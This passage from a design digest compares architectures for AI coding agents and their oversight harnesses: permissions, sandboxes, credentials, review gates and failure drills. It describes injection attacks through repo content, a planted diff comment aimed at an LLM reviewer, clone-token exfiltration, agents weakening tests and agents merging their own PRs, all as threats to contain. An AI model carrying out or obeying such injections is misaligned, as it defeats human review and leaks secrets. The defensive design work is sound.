| Parallel subagents edit one file | Worktree per editor; parent owns merge | step `verify` failureDrills[2] |
| Cloud sandbox dies mid-task | Lease expiry; re-lease; force-push same branch | step `cloud` failureDrills[0] |
| Malicious repo tries to exfiltrate clone token | Single-repo token, minutes TTL; egress only git host + model API | step `cloud` failureDrills[1] |
| Model upgrade silently degrades refactors | Versioned end-to-end evals; canary rollout | step `cloud` failureDrills[2] |
| Cancel mid-run | Explicit `canceled` transition; halt at next heartbeat; branch kept | step `cloud` failureDrills[3] |
| Poison task | Attempt cap → `failed` → DLQ with full event log | step `cloud` failureDrills[4] |
| Headless agent merges own PR | PR review non-negotiable; auto-merge only for policy-listed change types | step `cloud` trap |
| Abuse in sandboxes (crypto-mining, exfil) | Anomaly detection | step `cloud` description |

### 2.8 Domain constraints

- **Domain-specific (software development)**: ground truth is cheap and local (tests, types, build); git makes most local mutations reversible ("rm -rf inside a project-scoped sandbox loses the working tree (recoverable via git)", step `safety` concept "Blast radius"); PR review is an existing human gate; source code is sensitive IP (index privacy, zero-retention tenants).
- **Broadly applicable**: untrusted model principal; policy vs sandbox; injection via ingested content; append-only transcripts and prefix caching; idempotent retries; autonomy coupled to isolation; human attention as the final bottleneck ("a fleet of tireless code-writers makes human review the scarcest resource", step `cloud` recap).
- Latency: interactive (sub-second first token) vs background (~10 min tasks). Volume: very high (80M model calls/day).

### 2.9 API and data-model snippets worth quoting

- Model call (`api[POST /v1/messages]`): `{ "model": "...", "messages": [...], "tools": [...], "stream": true }` → "SSE: message_start, content_block_delta..., tool_use, message_stop".
- Idempotent delegation (`api[POST /v1/tasks].request`): `{ "repo": "org/app", "baseBranch": "main", "prompt": "fix issue #421", "idempotencyKey": "cli-7f3a", "policy": "team-default" }` → `{ "taskId": "t_8f2", "status": "queued", "branch": "agent/t_8f2" }`.
- Task events (`api[GET /v1/tasks/{taskId}/events]`): "Doubles as the audit trail and the live progress stream (SSE, with ?after=seq resume)".
- Local session event (`api[LOCAL session events --follow].response`): `{ "seq": 312, "type": "tool_call", "id": "tu_42", "tool": "bash", "decision": "rule:allow" }`.
- Permission CLI (`api[LOCAL permissions add | list | remove]`): `agent permissions add --tool bash --pattern 'npm test*' --action allow --scope project` → `"precedence": "most-specific wins; deny beats allow"`.
- Extensions (`api[LOCAL extensions install | review | revoke]`): `{ "extId": "ext_77a", "kind": "mcp_server", "pinnedVersion": "sha256:9c4e...", "reviewStatus": "approved" }`.
- `dataModel[permission_rules]`: `scope enum(user, project, session)`, `pattern` (command-prefix matcher), `path_scope`, `action enum(allow, deny, ask)`, `source enum(settings_file, always_allow_prompt, org_policy)`, `expires_at` ("session-scoped rules die with the session").
- `dataModel[tenant_policies]`: `transcript_retention enum(local_only, days_30, days_90, zero_retention)`, `prompt_cache enum(enabled, in_memory_only, disabled)`, `secret_redaction` ("applied before prompts, logs, telemetry, and task events"), `egress_allowlist`, `extension_policy`.
- `dataModel[tasks].note`: "queued → leased/running → pr_open | failed | canceled, with retries as new attempts onto the same task branch. An attempt cap parks poison tasks in a dead-letter state."
- Tool call example (step `agent-loop` concept "Tool use"): `{"tool": "bash", "input": {"command": "pytest tests/test_auth.py"}}`.
- Window budget example (step `context`): "200K window: ~5K system + ~5K memory, ~150K transcript, rest reserved for the next tool results."

### 2.10 Weaknesses and inconsistencies (CLI)

REVIEW.md items, checked against the current JSON:
- P1 local harness contracts — **fixed** (four `LOCAL` entries in `api`).
- P1 verification/evals first-class — **fixed** (`Verifier` node; `verifier-telemetry`, `telemetry-llm` links).
- P1 tenant privacy/retention — **fixed** (`dataModel[tenant_policies]`).
- P2 capacity diagram — **fixed** (two subgraphs).
- P2 context-search flow — **fixed** (step `context` flow "Finding the relevant 0.1% of the repo").
- P2 event/tool-call IDs — **fixed** (step `agent-loop` and `inference` flows).
- P3 cancellation, DLQ, revocation — **fixed** (step `cloud` failureDrills[3–4]; step `extensibility` failureDrills[0]).

Problems this digest found:
1. **Whole-task redo is not idempotent for non-git side effects.** Cloud retry "redoes" the task and force-pushes the same branch (step `cloud`). That is idempotent for git output only. A task that called an MCP `jira.create` (step `extensibility` flow) or another external tool would repeat that effect on attempt 2. CLI has no per-effect intent/result ledger like APF's `events`; its tool-call ID ledger is per session and is lost with the sandbox. Either restrict headless tasks to git-only effects, or bring in APF's per-effect idempotency.
2. **Container vs microVM for cloud sandboxes.** The `CloudSandbox` node is "Ephemeral containers that clone the repo", which contradicts APF's rule that model-authored code needs a hardware boundary. The CLI tech choice lists Firecracker but does not choose it. The book needs one rule.
3. **The clone token is inside the sandbox.** Step `cloud` failureDrills[1] contains the token's blast radius (one repo, minutes TTL) instead of keeping it out of the sandbox. APF's broker pattern ("agent uses but never sees secrets") is stronger. "Secrets never in the agent's context" is true only of the model context, not of the execution environment.
4. **Free reads vs the trifecta.** "Read-only tools run freely" (`agent-repo` link bypasses `Policy`). In APF terms a session that reads private files *and* ingests untrusted repo content has two trifecta legs, so CLI's only remaining guard is egress control. CLI states this ("Filesystem isolation without egress control still allows exfiltration", step `safety` trap), but the "free reads" framing should carry the condition: reads are only free while egress is closed.
5. **Impersonation by design locally.** "The agent is an untrusted principal acting with the user's identity" (step `safety` concept "Least privilege"). This is APF's anti-pattern (impersonation), accepted because the sandbox bounds it. The book should name the exception explicitly: local agent = user's identity bounded by the sandbox; cloud and platform agent = own principal.
6. **The approval audit is in the transcript, which is local.** Permission decisions append "to the session transcript as the audit trail" (`dataModel[permission_rules].note`), and interactive transcripts "stay local" (`capacity` transcript row). The "enterprise trust: … an audit trail for every agent action" requirement is then not centrally auditable for interactive sessions. This is a gap for regulated orgs.
7. **No eval data model.** Eval gating is asserted (`telemetry-llm`, step `cloud`) but there is no `eval_runs` or versioned-suite entity like APF's.
8. **Lead-with-approval vs autonomy coupling.** Step `safety` chooses "leads with ask-by-default", and its own drills require a sandbox before full-auto. That is consistent, but the book should state the policy as a matrix (autonomy level × isolation level) instead of a single "lead with".
9. Minor numeric tension: "~10x" input savings from caching (step `inference`) is consistent with >90% hit rate only if cached input is billed at about 10% of the full price. That is a pricing assumption, not an architecture fact; label it so.

### 2.11 Best uses in the book

- **Foundations**: completion vs agent; harness/model split; "same model, different harness, wildly different product" (step `agent-loop` concept "Harness").
- **Tools/execution**: tool catalog design; patch edits; output capping; policy vs sandbox; denial-as-result; extensions ledger; MCP trust.
- **Context/memory/state**: agentic search vs index; project memory precedence; compaction with pinned content; full log vs derived view.
- **Reliability/recovery**: tool-call ID ledger; stream resume; leases, attempts, DLQ, cancel.
- **Security/oversight**: autonomy-isolation coupling; injection via repo content; PR review as a relocated human gate; tenant zero-retention as a coherent mode.
- **Performance/economics**: append-only prefix caching, the strongest worked example of an architecture constraint that comes from inference economics.
- **Evaluation**: baseline-first verification; reward hacking on tests; evals gating model and harness changes.
- **Deployment/evolution**: interactive → headless graduation.

---

## 3. HAR — Coding Agent Harness (outer harness)

Source: `system-design-interviews/data/book/ai-coding-harness/interview.json` (no REVIEW.md; built on Birgitta Böckeler's "Harness engineering for coding agent users", martinfowler.com, cited in `toProbeFurther`)

### 3.1 Summary

HAR designs the **outer harness an engineering organisation wraps around a coding agent it buys**: "the agent is bought, the trust is built" (`description`). The users are ~2,000 developers who steer agents, plus the platform team that runs the harness. The failure it targets is quality and toil, not security. Human review is the only sensor, review effort grows linearly with agent output until reviewers rubber-stamp, and the agent repeats the same mistakes every session (step `naive`). The central idea is a cybernetic governor built on two axes, **feedforward guides vs feedback sensors** and **computational vs inferential execution**. Each control is placed in the lifecycle by cost and criticality ("keep quality left"), and a human **steering loop** turns every escape into a new guide or sensor. "A good harness doesn't aim to eliminate human input — it directs it to where it matters most" (step `scale`).

### 3.2 Requirements and capacity (illustrative assumptions)

Functional (`requirements.functional`): feedforward context; feedback the agent can self-correct from "before a human ever looks"; distribute checks by cost/criticality; continuous drift and runtime watching → cleanup PRs; a behaviour harness per task; human steering and template rollout.

Non-functional (`requirements.nonFunctional`): inner-loop sensors in seconds; "Deterministic where possible"; "Reduce human review toil without removing human accountability — the merge gate stays human until trust is earned per defect class"; bounded inference cost; an observable, maintainable harness.

Capacity (`capacity[]`): ~2,000 developers; ~10,000 sessions/day; ~500,000 edit/commit events/day (~15/s); fast sensor budget **< 30 s per run**; ~3,000 PRs/day; inferential review **~50K tokens/PR, ~$0.20–0.50**, "~$1K/day … affordable at PR granularity, ruinous on every edit event"; nightly drift scans over ~1,500 repos; "Human review: the scarcest resource".

### 3.3 Evolution path

| # | Step id (title) | Failure it fixes | What it adds |
| --- | --- | --- | --- |
| 1 | `naive` (1) | — baseline | Raw agent; human review as the only sensor. Names the **trust barrier** (non-determinism, missing context, token-level understanding) and **outer vs inner harness**. |
| 2 | `guides` (2) | Agent rediscovers or violates conventions every session | Feedforward: lean always-on rules file + on-demand how-tos and skills; computational feedforward (LSP, scaffolds, codemods). |
| 3 | `sensors` (3) | Open loop — nothing verifies output | Hook runner + computational sensors (lint, types, tests, ArchUnit/dependency-cruiser) under a time budget; **LLM-optimised sensor output**; self-correction loop. |
| 4 | `review-agents` (3a) | Structurally clean junk (semantic duplication, hollow tests, overengineering) | Inferential sensor tier: narrow **review lenses**, confidence and evidence, advisory-first, per-lens precision. |
| 5 | `lifecycle` (4) | Ad hoc sensor placement | Four stations: loop, pre-commit, human review (intent/scope only), authoritative pipeline (full suite, mutation testing, deep review); pipeline failures feed back to the agent. |
| 6 | `drift` (5) | Decay between changes is invisible | Scheduled drift scanners + runtime telemetry → throttled **janitor agents** opening cleanup PRs through the same pipeline. |
| 7 | `behaviour` (6) | Green tests the same agent wrote ("consistent, not correct") | Spec feedforward at fidelity scaled to blast radius; mutation testing; **approved fixtures**; honest manual testing for the rest. |
| 8 | `scale` (7) | 1,500 hand-built harnesses; nobody knows whether controls still work | Per-topology **harness templates** (Ashby's law); harnessability as a tech-choice input; **harness health** (fire rates, escapes, canary violations, coherence). |

### 3.4 Final architecture

| Node | Responsibility | Agent-specific? |
| --- | --- | --- |
| `Dev` | Writes prompts and specs, reviews escapes, steers the harness | Steering role is agent-era |
| `Agent` | Bought agent (model + inner harness), `external` | — (out of scope) |
| `Repo` | Code, tests, checked-in harness | Ordinary |
| `Guides` | Rules, how-tos, skills, codemods, scaffolds | **Agent-specific** |
| `CodeIntel` | LSP, symbol and dependency graphs | Ordinary tools, new consumer |
| `Spec` | Per-task functional spec | Agent-era emphasis |
| `Hooks` | Fires sensors post-edit/pre-commit; time budget; formats results for the LLM | **Agent-specific** |
| `CompSensors` | Deterministic checks | Ordinary CI tools |
| `ReviewAgents` | LLM-as-judge lenses | **Agent-specific** |
| `GitHost` / `CI` | PRs, merge gate; authoritative re-run + mutation + deep review | Ordinary, extended |
| `DriftAgents` | Scheduled scanners + janitor PRs | Agent-specific remediation |
| `Telemetry` | SLOs, logs, sampled quality → drift | Ordinary |
| `TemplateReg` | Versioned per-topology harness bundles | Platform-engineering analogue |
| `HarnessHealth` | Sensor fire/resolve rates, escapes | **Agent-specific meta-observability** |

Groupings: **Feedforward** (`Guides`, `CodeIntel`, `Spec`, `TemplateReg`) and **Feedback** (`Hooks`, `CompSensors`, `ReviewAgents`, `CI`, `DriftAgents`, `Telemetry`). Key loops: `dev-guides` ("encode lessons (steering loop)"); `comp-agent` ("feedback: failures + fix instructions"); `githost-health` ("escapes caught by humans") → `health-dev` ("where to steer next").

### 3.5 Reusable patterns (HAR)

| Pattern | Where |
| --- | --- |
| Inner vs outer harness | step `naive` concept "Harness (outer vs. inner)" |
| Feedforward guide paired with feedback sensor | step `guides` trap; step `sensors` trap "Sensors with no matching guide" |
| Lean always-on core + indexed on-demand library | step `guides` tradeoff |
| Mechanise repeat offenders (prose → scaffold/codemod/lint rule) | step `guides` tradeoff "Prose vs. mechanization" |
| Ambient affordances (types, module boundaries as implicit guides) | step `guides` concept |
| LLM-optimised sensor messages ("positive prompt injection") | step `sensors` |
| Time-budgeted self-correction loop | step `sensors`; `capacity` |
| Block on fast high-precision, advise on the rest | step `sensors` tradeoff |
| Sensor auto-quarantine for broken sensors | step `sensors` failureDrills[0] |
| Narrow review lenses with evidence and confidence | step `review-agents` |
| Advisory-first, promote to blocking on proven precision | step `review-agents` trap |
| Strong judge at low frequency | step `review-agents` tradeoff |
| Advisory loop run + authoritative pipeline run | step `lifecycle` concept |
| Bounded CI fix rounds before human takeover | step `lifecycle` talkingPoints (Stripe, third-party claim) |
| Human review redirected to intent, scope, misdiagnosis | step `lifecycle` trap |
| Continuous detection, gated remediation (janitor via the same pipeline) | step `drift` |
| Throttle to review capacity, not generation capacity | step `drift` flow note |
| Auto-merge only for proven no-risk classes | step `drift` tradeoff |
| Mutation testing as test-honesty sensor | steps `lifecycle`, `behaviour` |
| Approved fixtures (human approves behaviour, not test code) | step `behaviour` |
| Spec fidelity scaled to blast radius | step `behaviour` tradeoff |
| Explicit verification tiering (sensor-verified / fixture-approved / human-tested) | step `behaviour` description |
| Per-topology harness template (variety reduction) | step `scale` |
| Canary violations for dead sensors | step `scale` trap |
| Escape analysis as the steering backlog | step `scale`; `dataModel[escapes]` |
| Guide/sensor coherence checks, atomic upgrades | step `scale` failureDrills[0] |
| Pin judge model per lens; re-benchmark before upgrade | step `scale` failureDrills[1] |

### 3.6 Design decisions and trade-offs (HAR)

- **Prose vs computational guides** (step `guides` options): prose first, then mechanise. Computational guides have "Zero context cost: structure arrives as tool results".
- **Always-loaded vs on-demand**: "promote a guide to always-on only when sensors show it being missed."
- **Blocking vs advisory; loop speed vs depth** (step `sensors`).
- **Computational-only vs add inferential** (step `review-agents` options): a judge "can share blind spots with the coding model — same family, same miss."
- **Sensor coverage vs determinism**: "imports non-determinism into the harness itself — the thing built to compensate for model non-determinism."
- **Pipeline depth vs integration frequency**: blocking pipeline under ~15 minutes; heavier analyses post-merge or nightly.
- **Duplicate sensor cost**: "CPU time is the cheapest resource in the whole system, far cheaper than tokens or human attention."
- **Cleanup throughput vs review capacity; continuous depth vs compute** (step `drift`): computational nightly, inferential weekly or sampled.
- **Autonomy vs verified intent; spec effort vs iteration speed** (step `behaviour`).
- **Template standardisation vs team autonomy**: "Templates as versioned dependencies with a thin local-override layer; template CI runs each release against a corpus of real repos."
- **Harness investment vs delivery pressure**: build the control for the defect class "that most recently cost human time".
- Tech choice (guides): "the registry (templates) distributes them, it doesn't serve them at runtime"; a repo-native bundle "removes the need for a separate runtime 'context service'."
- Tech choice (CI): pipeline sensors "must exactly mirror the loop's (same versions, same configs)".
- Tech choice (computational sensors): "Every rule you can express computationally is one you stop paying inference or human attention for."

### 3.7 Failure modes and containment (HAR)

| Failure | Containment | Where |
| --- | --- | --- |
| Review toil grows linearly until rubber-stamping | Guides + sensors before more agent runs | step `naive` trap |
| Bloated rules file degrades compliance | Layered bundle; mechanise | step `guides` trap |
| Guides rot into folklore | Pair with sensors | step `guides` trap |
| Raw stack traces poison context | Curated, actionable messages | step `sensors` trap |
| 5-minute suite in the post-edit hook | Changed-file scoping; full suite in pipeline | step `sensors` trap |
| Broken linter fails 100% of runs | Auto-demote to advisory; flag harness health | step `sensors` failureDrills[0] |
| Agent weakens an assertion | Diff-aware flag; mutation testing | step `sensors` failureDrills[1] |
| Mega-prompt reviewer gives shallow findings | Narrow lenses | step `review-agents` trap |
| False positives at blocking severity kill the harness politically | Advisory first | step `review-agents` trap |
| Green in-loop treated as merge-worthy | Pipeline is the gate of record | step `lifecycle` trap |
| Merge gate latency creep | Budget the gate; post-merge janitors | step `lifecycle` trap |
| Janitor fleet floods 400 PRs | Throttle, batch, prioritise by blast radius | step `drift` description |
| Janitor PRs bypass the pipeline | Same authoritative gate | step `drift` trap |
| Test circularity (misread spec, code and tests agree) | Fixtures, mutation, manual testing named | step `behaviour` |
| Reflexive fixture approval | Selective use; diff UX | step `behaviour` trap; tech choice "Mutation and approval testing" |
| Silent sensor taken as high quality | Canary violations | step `scale` trap |
| Guide/sensor contradiction after partial upgrade | Coherence checks; atomic upgrades | step `scale` failureDrills[0] |
| Lens precision drops after model upgrade (0.9 → 0.5) | Per-lens precision vs human triage; auto-demote; pin judge model | step `scale` failureDrills[1] |

### 3.8 Domain constraints

- **Domain-specific**: an org of ~2,000 developers and ~1,500 repos; the agent is a vendor product (no control of its inner harness); quality defects are mostly reversible before merge; mature CI tooling exists to reuse.
- **Broadly applicable**: feedforward/feedback × computational/inferential classification (fits any agent whose output can be checked); human attention as the scarcest resource; escapes as backlog; advisory → blocking promotion by measured precision; meta-observability of the control system; Ashby's-law argument for narrowing the agent's variety.

### 3.9 API and data-model snippets worth quoting

- `api[POST /v1/sensors/run].response`: `{ "findings": [ { "sensor": "eslint", "severity": "error", "messageLlm": "...fix instructions..." } ], "durationMs": 8200 }`.
- `api[POST /v1/reviews].response`: `{ "findings": [ { "lens": "redundancy", "claim": "duplicates retry logic in lib/retry.ts", "confidence": 0.8 } ] }`.
- `api[GET /v1/harness/health/{repo}].response`: `{ "sensors": [ { "id": "arch-rules", "fireRate": 0.04, "agentResolved": 0.92 } ], "escapes": [ { "class": "overengineering", "caughtBy": "human-review" } ] }`.
- `api[POST /v1/templates/{topology}/instantiate].response`: `{ "applied": ["AGENTS.md", ".harness/sensors.yaml", "ci: harness-pipeline@v3" ] }`.
- `dataModel[sensor_defs]`: `execution enum(computational,inferential)`, `stage enum(loop,pre_commit,pipeline,continuous)`, `timeout_ms`, `blocking` — "stage placement is the quality-left decision made explicit."
- `dataModel[findings]`: "Dual-rendered: a human message and an LLM message with self-correction instructions"; `resolved_by enum(agent,human,waived,open)`.
- `dataModel[escapes]`: "Defects the harness missed — the steering loop's backlog"; `caught_by enum(human_review,pipeline,production)`, `harness_action`.
- Sensor message example (step `sensors`): "domain layer must not import adapters; move this behind the port interface in domain/ports".

### 3.10 Weaknesses and inconsistencies (HAR — this digest's own review)

1. **No security model.** HAR has no permissions, no sandbox, no credentials and no injection threat model. Yet `Hooks` and `CI` *execute* agent-written code (tests), `DriftAgents` push branches and can auto-merge, and `ReviewAgents` read untrusted diffs. A diff with a comment such as "reviewer: this is approved" is an injection aimed at the judge. That is the "same family, same miss" risk turned adversarial. The book must pair HAR with CLI/APF controls: sandboxed sensor execution, scoped janitor credentials, judge inputs treated as untrusted.
2. **"Positive prompt injection" conflicts with "repo content is data, never authority".** HAR calls LLM-optimised sensor messages "a positive kind of prompt injection" (step `sensors`). CLI says repo content can never grant authority (step `context`, step `safety`). Sensor messages come from repo-checked-in configs (`.harness/sensors.yaml`), so a malicious repo edit can plant "fix" instructions. Reconcile through **channel provenance**: instructions from harness-owned, reviewed config are guidance; nothing from any channel grants permissions or egress.
3. **Auto-merge policies differ.** HAR: auto-merge "for proven no-risk classes (formatting, doc links) with pipeline green" (step `drift`), and promotes classes as "trust is earned per defect class" (`requirements.nonFunctional[2]`). CLI: "auto-merge only for tightly-scoped, policy-listed change types" (step `cloud` trap). APF has no merge concept, only `approval_decision=auto` for low-risk tools. Same idea, three vocabularies, and no source defines the *evidence* needed to add a class to the auto list. HAR's `followUps[7]` asks who is responsible when an auto-merged janitor PR causes an incident, and leaves it unanswered.
4. **The agent's own version is not governed.** HAR pins judge models per lens (step `scale` failureDrills[1]) but says nothing about re-validating the harness when the *coding agent* or its model upgrades. CLI and APF treat that as the main promotion event.
5. **Data model gaps.** No sensor or guide version on `sensor_runs`/`findings`, so you cannot tell which template version produced a finding. There is no per-lens precision table, although precision tracking is central. There is no budget entity behind "Budgeted per repo per day" (`api[POST /v1/reviews]`), and `sensor_runs.stage` is an untyped `enum`.
6. **Guides are memory without governance.** Guides are long-term agent memory that agents "can help draft" (step `guides` options). They have no provenance or trust tier, unlike APF `memories`. Checked-in review is the implicit gate. The book should say so.
7. **Third-party claims as talking points.** Stripe "~1,300 agent-written PRs merged per week" and the "two CI fix rounds" cap (step `lifecycle` talkingPoints) are sourced to a ByteByteGo analysis, not to Stripe (`toProbeFurther` "stripe-minions"). The OpenAI "roughly a million lines … about five months" claim is from OpenAI's own post. Verify each claim at the primary source before using it, and attribute it to the publisher.
8. Capacity check: 3,000 PRs × $0.20–0.50 = $600–1,500/day, consistent with "~$1K/day". 500K edits/day ÷ 10K sessions = 50 edit events per session, plausible with "dozens of loop turns".

### 3.11 Best uses in the book

- **Foundations**: inner vs outer harness; trust barrier; "agent = model + harness".
- **Evaluation/observability**: computational vs inferential evaluators; lens precision; advisory → blocking promotion; harness health and escape analysis; canary violations (mutation testing for the controls).
- **Reliability**: self-correction loop with time budget; bounded fix rounds.
- **Security/oversight**: human attention redirected, not removed; tiered verification; auto-merge classes (with the gaps in 3.10).
- **Context**: context budget for guides; progressive disclosure of how-tos (matches CLI skills).
- **Deployment/evolution**: per-topology templates; harnessability as a technology-selection input; legacy modernisation as harness construction.
- **Performance/economics**: placing evaluators by cost (CPU ≪ tokens ≪ human attention).

---

## 4. Cross-source synthesis

### 4.1 Recurring patterns and each source's name for them

| Book-level pattern | APF name | CLI name | HAR name |
| --- | --- | --- | --- |
| Deterministic shell around a probabilistic model | "agent harness / runtime scaffold" (`naive` concept) | "Harness" (`agent-loop` concept) | "inner harness" (vendor) vs "outer harness" (org) (`naive` concept) |
| Offline quality scoring | "Eval / Replay Harness" (`EvalHarness`) | "Eval harness" (`cloud` concept; explicitly distinct from the agent harness) | review lenses + mutation + fixtures; no "eval harness" node |
| Policy decision before effect | Guardrail / Policy Engine; `policy_versions` | Permission Engine; `permission_rules` | Blocking sensors (after effect, before merge) |
| Containment of execution | per-session microVM sandbox | OS sandbox locally; ephemeral containers in cloud | **absent** |
| Credentials | broker performs call / mints delegated token | scoped short-lived single-repo token in sandbox; per-MCP-server credential | **absent** |
| Supply-chain pinning | `tool_manifests.manifest_hash` | `extensions.pinned_version`, `review_status` | `harness_templates.version` (for controls, not tools) |
| Human gate | approval bound to `evidenceId` + policy version | approval prompt (once/always/deny) locally; PR review headless | human merge gate per risk class; fixture approval |
| Auto path | `approval_decision=auto` for low risk | "always allow" rules; policy-listed auto-merge types | auto-merge for proven no-risk classes |
| Durable record of actions | `events` + `action_evidence` | JSONL session events; `task_events` | `sensor_runs`, `findings`, `escapes` |
| Idempotent retry | per-effect intent/result + idempotency key | tool-call ID ledger; branch-per-task; `idempotencyKey` on `/v1/tasks` | — |
| Budget that stops work | per-run hard token cap (terminate); tenant `on_exhaustion` | max turns, token budget, doom-loop detection; account spend caps | sensor `timeout_ms`; per-repo review budget; two CI fix rounds |
| Context economy | reversible compaction; prefix caching | agentic search; compaction with pins; progressive disclosure; append-only prefix | lean always-on rules + on-demand how-tos |
| Long-term memory | `memories` with provenance/trust/TTL | project memory file (guidance, not authority) | Guides (rules, how-tos, skills), steered by humans |
| Fan-out | orchestrator-workers sub-agents | Subagents + worktrees | janitor fleet (scheduled, not fan-out) |
| Promotion by evidence | promote agent version iff `eval_runs.gate_passed` | rollout ships "only on green evals"; canary | lens advisory → blocking on precision; template CI on a repo corpus |
| Observing the controls | silent-failure detection (right answer, broken path) | cache-hit rate as regression metric | harness health: fire rates, escapes, canaries |

### 4.2 Where the sources disagree (must be reconciled in the book)

1. **"Harness" has three meanings.** Proposed book vocabulary: **agent runtime** (APF/CLI "harness", HAR "inner harness"); **control harness** (HAR "outer harness": org-owned guides and sensors); **eval harness** (offline scoring and promotion). Use the qualifier every time.
2. **Isolation strength.** APF: microVM for any model-authored code. CLI: OS sandbox locally (Seatbelt/bubblewrap) and *containers* in the cloud. HAR: nothing. Proposed rule: isolation scales with autonomy *and* with who can observe the session. Unattended multi-tenant execution of model-authored code gets a hardware boundary; a container is acceptable only for trusted, low-risk tools (APF tech choice).
3. **Credential model.** APF: the agent never holds a secret (brokered call or audience-bound delegated token). CLI cloud: a scoped token sits in the sandbox. CLI local: the agent acts as the user. Proposed ladder: impersonation bounded by sandbox (local, a human present) → scoped short-lived token in the sandbox (headless, single resource) → brokered/delegated identity (multi-tenant platform, downstream business systems).
4. **Approval semantics.** APF approves a *specific pending action* (race-safe, expiring, bound to policy version). CLI approves a *command pattern* and can persist it as a rule, which is a standing grant with no policy-version binding. CLI headless and HAR approve an *outcome* (PR or merge). These are three granularities: action, rule, outcome. The book should name them and say what each is evidence of. A CLI "always allow" rule created mid-session has no counterpart in APF's evidence model.
5. **State and idempotency.** APF: per-side-effect intent/result ledger. CLI: per-session tool-call IDs plus whole-task redo with force-push. These differ in granularity, and CLI's task redo is unsafe for non-git effects (see 2.10 #1). Proposed rule: whole-task redo is acceptable only when every effect is in a disposable workspace (a branch); any external effect needs the per-effect ledger.
6. **Reads are free vs the trifecta.** CLI runs read-only tools without policy. APF treats private-data access as a trifecta leg. Reconcile: reads are free only while the session has no open egress.
7. **What counts as an instruction.** CLI: repo content is data; memory is guidance below the user. HAR: sensor messages are deliberate "positive prompt injection" from checked-in config. APF: "a recalled instruction is data, not a grant". Unifying rule: instructions can shape *behaviour* according to channel provenance; *authority* (permissions, egress, credentials) comes only from policy and identity, never from content.
8. **Exactly-once wording.** APF still mixes "exactly-once side effects" with the correct "exactly-once effect". CLI says a resumed stream replays "exactly once" (stream events, not effects). Book standard: at-least-once delivery + idempotency key + durable result = exactly-once *effect*.
9. **Token profiles.** APF: ~12 steps × ~8K context (~108K tokens/session; cache 60–70%). CLI: ~40 calls × ~50K (≈2M input tokens/session; cache >90%). Both are illustrative. The gap is itself a lesson: coding sessions are long, append-only and file-heavy, so caching matters more. Do not merge the numbers.
10. **Promotion objects.** APF promotes *agent versions* (without the model id). CLI gates *model and harness* rollouts. HAR promotes *controls* (lenses, templates). A complete account needs all three, with the model version inside the promoted unit.
11. **Merge autonomy.** CLI: PR review "non-negotiable", with narrow policy-listed exceptions. HAR: auto-merge classes earned per defect class. Neither defines the evidence threshold or the liability owner (HAR `followUps[7]`).

### 4.3 Strongest domain contrasts

| Dimension | APF (enterprise agent platform) | CLI (developer coding agent) | HAR (org quality harness) |
| --- | --- | --- | --- |
| Consequence of failure | Business side effects at third parties (payments, emails), data exfiltration across tenants | Corrupted working tree, leaked repo token, wasted spend, unverified merges | Review toil, quality decay, rubber-stamped defects |
| Reversibility | Often irreversible; needs `compensated` | Mostly reversible locally (git, worktrees, branch-per-task); not for MCP side effects | Reversible before merge; incidents after auto-merge |
| Required human control | Per-action approval bound to evidence at high/irreversible risk | Per-command prompts locally → PR review headless | Merge gate per risk class; fixture approval; steering |
| Ground truth available | Weak: needs judges, trajectories, humans | Strong and cheap: tests, types, build | Strong for structure; weak for behaviour (test circularity) |
| Data sensitivity | Tenant data, memory, delegated user authority | Source code IP, local secrets, transcripts (zero-retention mode) | Source code; diffs sent to judge models |
| Latency target | p95 first step < 3 s | p50 first token < 1 s | sensors < 30 s per run; pipeline < ~15 min |
| Volume (illustrative) | 200K sessions/day, ~21.6B tokens/day | 2M sessions/day, ~4T input tokens/day | 500K edit events/day, 3K PRs/day |
| Threat model | Model assumed compromised | Model "helpful but not trusted" | Model fallible; not adversarial (gap) |
| Who owns the agent runtime | The platform | The vendor/product | Bought — out of scope |

### 4.4 The five most reusable patterns across the group

1. **Policy before effect, containment around effect.** APF guardrail + sandbox; CLI "policy decides intent; the sandbox bounds impact". Pair with "autonomy up, isolation up".
2. **Exactly-once effect by intent/result ledger + idempotency key.** APF `events`; CLI tool-call ID ledger and idempotent task submission. Extend to branch-per-task only for disposable workspaces.
3. **Promotion by recorded evidence.** Immutable versions, gated by eval runs or measured precision, flipped by pointer and reversible. APF promote, CLI eval-gated rollouts, HAR advisory → blocking lenses and template CI.
4. **Content is data; authority comes only from policy and identity.** APF "recalled instruction is data, not a grant"; CLI "guidance, not authority"; trifecta partitioning; pinned and revocable extensions/manifests.
5. **Terminating budgets on every loop.** Token caps that kill the run, turn caps and doom-loop detection, sensor time budgets, bounded fix rounds, attempt caps → DLQ.

Close runners-up: full-fidelity log plus a derived in-window view (CLI compaction; APF reversible compaction); progressive disclosure of capabilities (CLI skills and schemas, HAR on-demand how-tos); meta-observability of the control system (HAR harness health, APF silent-failure detection).
